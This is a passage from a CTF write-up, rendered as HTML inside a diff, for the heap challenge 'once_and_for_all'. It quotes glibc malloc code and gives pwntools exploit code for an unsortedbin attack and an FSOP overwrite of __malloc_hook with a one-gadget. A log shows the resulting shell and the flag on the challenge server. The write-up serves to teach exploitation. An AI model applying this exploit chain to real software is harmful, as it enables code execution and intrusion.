+<span style="color:#6272a4">// It checks first fastbin then smallbin then unsorted bin
+</span><span style="color:#6272a4"></span>
+<span style="color:#ff79c6">for</span> (;; )
+    {
+      <span style="color:#8be9fd">int</span> iters <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+      <span style="color:#ff79c6">while</span> ((victim <span style="color:#ff79c6">=</span> unsorted_chunks (av)<span style="color:#ff79c6">-&gt;</span>bk) <span style="color:#ff79c6">!=</span> unsorted_chunks (av))
+        {
+          bck <span style="color:#ff79c6">=</span> victim<span style="color:#ff79c6">-&gt;</span>bk;
+          <span style="color:#ff79c6">if</span> (__builtin_expect (chunksize_nomask (victim) <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> SIZE_SZ, <span style="color:#bd93f9">0</span>)
+              <span style="color:#ff79c6">||</span> __builtin_expect (chunksize_nomask (victim)
+				   <span style="color:#ff79c6">&gt;</span> av<span style="color:#ff79c6">-&gt;</span>system_mem, <span style="color:#bd93f9">0</span>))
+            malloc_printerr (<span style="color:#f1fa8c">&#34;malloc(): memory corruption&#34;</span>);
+          size <span style="color:#ff79c6">=</span> chunksize (victim);
+
+          <span style="color:#6272a4">/*
+</span><span style="color:#6272a4">             If a small request, try to use last remainder if it is the
+</span><span style="color:#6272a4">             only chunk in unsorted bin.  This helps promote locality for
+</span><span style="color:#6272a4">             runs of consecutive small requests. This is the only
+</span><span style="color:#6272a4">             exception to best-fit, and applies only when there is
+</span><span style="color:#6272a4">             no exact fit for a small chunk.
+</span><span style="color:#6272a4">           */</span>
+
+          <span style="color:#ff79c6">if</span> (in_smallbin_range (nb) <span style="color:#ff79c6">&amp;&amp;</span>
+              bck <span style="color:#ff79c6">==</span> unsorted_chunks (av) <span style="color:#ff79c6">&amp;&amp;</span>
+              victim <span style="color:#ff79c6">==</span> av<span style="color:#ff79c6">-&gt;</span>last_remainder <span style="color:#ff79c6">&amp;&amp;</span>
+              (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span>) (size) <span style="color:#ff79c6">&gt;</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span>) (nb <span style="color:#ff79c6">+</span> MINSIZE))
+            {
+              <span style="color:#6272a4">/* split and reattach remainder */</span>
+              remainder_size <span style="color:#ff79c6">=</span> size <span style="color:#ff79c6">-</span> nb;
+              remainder <span style="color:#ff79c6">=</span> chunk_at_offset (victim, nb);
+              unsorted_chunks (av)<span style="color:#ff79c6">-&gt;</span>bk <span style="color:#ff79c6">=</span> unsorted_chunks (av)<span style="color:#ff79c6">-&gt;</span>fd <span style="color:#ff79c6">=</span> remainder;
+              av<span style="color:#ff79c6">-&gt;</span>last_remainder <span style="color:#ff79c6">=</span> remainder;
+              remainder<span style="color:#ff79c6">-&gt;</span>bk <span style="color:#ff79c6">=</span> remainder<span style="color:#ff79c6">-&gt;</span>fd <span style="color:#ff79c6">=</span> unsorted_chunks (av);
+              <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>in_smallbin_range (remainder_size))
+                {
+                  remainder<span style="color:#ff79c6">-&gt;</span>fd_nextsize <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">NULL</span>;
+                  remainder<span style="color:#ff79c6">-&gt;</span>bk_nextsize <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">NULL</span>;
+                }
+
+              set_head (victim, nb <span style="color:#ff79c6">|</span> PREV_INUSE <span style="color:#ff79c6">|</span>
+                        (av <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">&amp;</span>main_arena <span style="color:#ff79c6">?</span> <span style="color:#8be9fd;font-style:italic">NON_MAIN_ARENA</span> : <span style="color:#bd93f9">0</span>));
+              set_head (remainder, remainder_size <span style="color:#ff79c6">|</span> PREV_INUSE);
+              set_foot (remainder, remainder_size);
+
+              check_malloced_chunk (av, victim, nb);
+              <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>p <span style="color:#ff79c6">=</span> chunk2mem (victim);
+              alloc_perturb (p, bytes);
+              <span style="color:#ff79c6">return</span> p;
+            }
+
+          <span style="color:#6272a4">/* remove from unsorted list */</span>
+          unsorted_chunks (av)<span style="color:#ff79c6">-&gt;</span>bk <span style="color:#ff79c6">=</span> bck;
+          bck<span style="color:#ff79c6">-&gt;</span>fd <span style="color:#ff79c6">=</span> unsorted_chunks (av);
+
+          <span style="color:#6272a4">/* Take now instead of binning if exact fit */</span>
+
+          <span style="color:#ff79c6">if</span> (size <span style="color:#ff79c6">==</span> nb)
+            {
+              set_inuse_bit_at_offset (victim, size);
+              <span style="color:#ff79c6">if</span> (av <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">&amp;</span>main_arena)
+		set_non_main_arena (victim);
+<span style="color:#ff79c6">#if USE_TCACHE
+</span><span style="color:#ff79c6"></span>	      <span style="color:#6272a4">/* Fill cache first, return to user only if cache fills.
+</span><span style="color:#6272a4">		 We may return one of these chunks later.  */</span>
+	      <span style="color:#ff79c6">if</span> (tcache_nb
+		  <span style="color:#ff79c6">&amp;&amp;</span> tcache<span style="color:#ff79c6">-&gt;</span>counts[tc_idx] <span style="color:#ff79c6">&lt;</span> mp_.tcache_count)
+		{
+		  tcache_put (victim, tc_idx);
+		  return_cached <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
+		  <span style="color:#ff79c6">continue</span>;
+		}
+	      <span style="color:#ff79c6">else</span>
+		{
+<span style="color:#ff79c6">#endif
+</span><span style="color:#ff79c6"></span>              check_malloced_chunk (av, victim, nb);
+              <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>p <span style="color:#ff79c6">=</span> chunk2mem (victim);
+              alloc_perturb (p, bytes);
+              <span style="color:#ff79c6">return</span> p;
+<span style="color:#ff79c6">#if USE_TCACHE
+</span><span style="color:#ff79c6"></span>		}
+<span style="color:#ff79c6">#endif
+</span><span style="color:#ff79c6"></span>            }
+
+	[...]
+}
+</code></pre></div><p>According to what I said earlier, the goal is to replace <code>stdin-&gt;_IO_buf_end</code> with <code>&amp;unsortedbin</code> which means we have to write to the backward pointer of the last chunk in the unsorted bin (chunk_2) <code>&amp;stdin-&gt;_IO_buf_end - 0x10</code>. To do so we can trigger a write after free primitive by taking back <code>chunk_2</code> from the unsorted bin to the fastbin:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f1fa8c">&#34;&#34;&#34;
+</span><span style="color:#f1fa8c">Before:
+</span><span style="color:#f1fa8c">0x30: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0
+</span><span style="color:#f1fa8c">0x40: 0x555555608560 —▸ 0x5555556085a0 ◂— 0x0
+</span><span style="color:#f1fa8c">unsortedbin
+</span><span style="color:#f1fa8c">all: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0
+</span><span style="color:#f1fa8c">&#34;&#34;&#34;</span>
+
+add(<span style="color:#bd93f9">7</span>, <span style="color:#bd93f9">56</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">55</span>) <span style="color:#6272a4"># pop it to access to chunk_1</span>
+
+add(<span style="color:#bd93f9">8</span>, <span style="color:#bd93f9">56</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">56</span> <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x31</span><span style="color:#f1fa8c">&#34;</span>) <span style="color:#6272a4"># restore valid fastbin chunk part of the 0x30 freelist</span>
+<span style="color:#6272a4"># put it back to the fastbin </span>
+
+add(<span style="color:#bd93f9">9</span>, <span style="color:#bd93f9">40</span>, pwn<span style="color:#ff79c6">.</span>p64(libc <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x3ebca0</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(stdin <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x40</span> <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x10</span>))
+<span style="color:#6272a4"># Write after free, &amp;stdin-&gt;_IO_buf_end = stdin + 0x40, minus 0x10 point to the fake header</span>
+
+<span style="color:#f1fa8c">&#34;&#34;&#34;
+</span><span style="color:#f1fa8c">After:
+</span><span style="color:#f1fa8c">0x30: 0x7ffff7dcfca0 (main_arena+96) —▸ 0x5555556085e0 ◂— 0x7ffff7dcfca0
+</span><span style="color:#f1fa8c">unsortedbin
+</span><span style="color:#f1fa8c">all [corrupted]
+</span><span style="color:#f1fa8c">FD: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0
+</span><span style="color:#f1fa8c">BK: 0x5555556085e0 —▸ 0x7ffff7dcfa30 (_IO_2_1_stdin_+48) ◂— 0x0
+</span><span style="color:#f1fa8c">&#34;&#34;&#34;</span>
+</code></pre></div><p>As you can read right above, the <code>chunk_2</code> has its backward pointer set to <code>&amp;stdin-&gt;_IO_buf_end - 0x10</code>. To achieve the partial unlink we just have to request a <code>0x30</code> sized chunk with nothing in the fastbin freelists. That&rsquo;s the last step of the unsortedbin attack, clean out the fastbin:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f1fa8c">&#34;&#34;&#34;
+</span><span style="color:#f1fa8c">Before: same as above
+</span><span style="color:#f1fa8c">&#34;&#34;&#34;</span>
+
+<span style="color:#6272a4"># == clean fastbin</span>
+
+freexalloc(<span style="color:#bd93f9">5</span>, <span style="color:#bd93f9">560</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>, doubleFree<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
+
+freexalloc(<span style="color:#bd93f9">4</span>, <span style="color:#bd93f9">560</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>, doubleFree<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
+add(<span style="color:#bd93f9">11</span>, <span style="color:#bd93f9">56</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;1&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">56</span> <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x40</span><span style="color:#f1fa8c">&#34;</span>)
+
+freexalloc(<span style="color:#bd93f9">5</span>, <span style="color:#bd93f9">560</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>, doubleFree<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
+add(<span style="color:#bd93f9">12</span>, <span style="color:#bd93f9">56</span>, pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>))
+
+freexalloc(<span style="color:#bd93f9">4</span>, <span style="color:#bd93f9">560</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>, doubleFree<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
+add(<span style="color:#bd93f9">13</span>, <span style="color:#bd93f9">56</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;1&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">56</span> <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x30</span><span style="color:#f1fa8c">&#34;</span>)
+
+add(<span style="color:#bd93f9">14</span>, <span style="color:#bd93f9">40</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;1&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">10</span>)
+
+<span style="color:#6272a4"># == clean fastbin</span>
+
+<span style="color:#f1fa8c">&#34;&#34;&#34;
+</span><span style="color:#f1fa8c">fastbins
+</span><span style="color:#f1fa8c">0x30: 0x0
+</span><span style="color:#f1fa8c">0x40: 0x0
+</span><span style="color:#f1fa8c">&#34;&#34;&#34;</span>
+</code></pre></div><p>Now we just have to ask for a <code>0x30</code> sized chunk:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">add(<span style="color:#bd93f9">3</span>, <span style="color:#bd93f9">40</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;1337&#34;</span>, hang<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
+pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;unsortedbin attack done on: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(stdin <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x40</span> <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x10</span>)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;Enjoy your shell!&#34;</span>)
+
+<span style="color:#f1fa8c">&#34;&#34;&#34;
+</span><span style="color:#f1fa8c">After:
+</span><span style="color:#f1fa8c">0x7ffff7dcfa40 &lt;_IO_2_1_stdin_+64&gt;:	0x00007ffff7dcfca0 &lt;- stdin-&gt;_IO_buf_end
+</span><span style="color:#f1fa8c">0x7ffff7dcfca0 &lt;main_arena+96&gt;:	0x00005555556086b0 &lt;- unsortedbin
+</span><span style="color:#f1fa8c">&#34;&#34;&#34;</span>
+</code></pre></div><h2 id="fsop--profit">FSOP + PROFIT</h2>
+<p>The last part is very easy, we just have to overflow up to <code>&amp;__malloc_hook</code> to write the one-gadget:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">io<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>) 
+io<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt;&gt; &#34;</span>) 
+io<span style="color:#ff79c6">.</span>send( 
+        <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;4</span><span style="color:#f1fa8c">\n\x00\x00\x00</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">+</span> 
+        pwn<span style="color:#ff79c6">.</span>p64(libc <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x3ed8d0</span>) <span style="color:#ff79c6">+</span> 
+        pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0xffffffffffffffff</span>) <span style="color:#ff79c6">+</span> 
+        pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">+</span> 
+        pwn<span style="color:#ff79c6">.</span>p64(libc <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x3ebae0</span>) <span style="color:#ff79c6">+</span> 
+        pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">3</span> <span style="color:#ff79c6">+</span> 
+        pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x00000000ffffffff</span>) <span style="color:#ff79c6">+</span> 
+        pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">+</span> 
+        pwn<span style="color:#ff79c6">.</span>p64(libc <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x3e82a0</span>) <span style="color:#ff79c6">+</span> 
+        pwn<span style="color:#ff79c6">.</span>p8(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x150</span> <span style="color:#ff79c6">+</span>  
+        <span style="color:#6272a4"># !!!!! </span>
+        pwn<span style="color:#ff79c6">.</span>p64(libc <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x10a38c</span>) <span style="color:#6272a4"># &lt;- one-gadget</span>
+        <span style="color:#6272a4">#pwn.p64(libc + 0x4f322) </span>
+        <span style="color:#6272a4"># pwn.p64(0x1337) </span>
+        )
+<span style="color:#f1fa8c">&#34;&#34;&#34;
+</span><span style="color:#f1fa8c">0x10a38c execve(&#34;/bin/sh&#34;, rsp+0x70, environ)
+</span><span style="color:#f1fa8c">constraints:
+</span><span style="color:#f1fa8c">  [rsp+0x70] == NULL
+</span><span style="color:#f1fa8c">&#34;&#34;&#34;</span>
+</code></pre></div><p>The <code>4\n\x00\x00\x00</code> corresponds to the option that asks for the huge chunk (we cannot allocate standards chunks anymore) which will trigger <code>__malloc_hook</code> :).</p>
+<p>Which gives:</p>
+<pre tabindex="0"><code>root@3b9bf5405b71:/mnt# python3 exploit.py REMOTE HOST=167.172.56.180 PORT=30332
+[*] '/mnt/once_and_for_all'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    RUNPATH:  b'/mnt/out'
+[+] Opening connection to 167.172.56.180 on port 30332: Done
+[*] Switching to interactive mode
+
+How much space do you need for this massive weapon: Adding to your inventory..
+$ id
+uid=100(ctf) gid=101(ctf)
+$ ls
+flag.txt
+glibc
+once_and_for_all
+$ cat flag.txt
+HTB{m4y_th3_f0rc3_b3_w1th_B0Nn13!}
+</code></pre><p>Find the tasks and the final exploit <a href="https://github.com/ret2school/ctf/blob/master/2022/apocalypse/onceAndmore/">here</a> and <a href="https://github.com/ret2school/ctf/blob/master/2022/apocalypse/onceAndmore/exploit.py">here</a>.</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
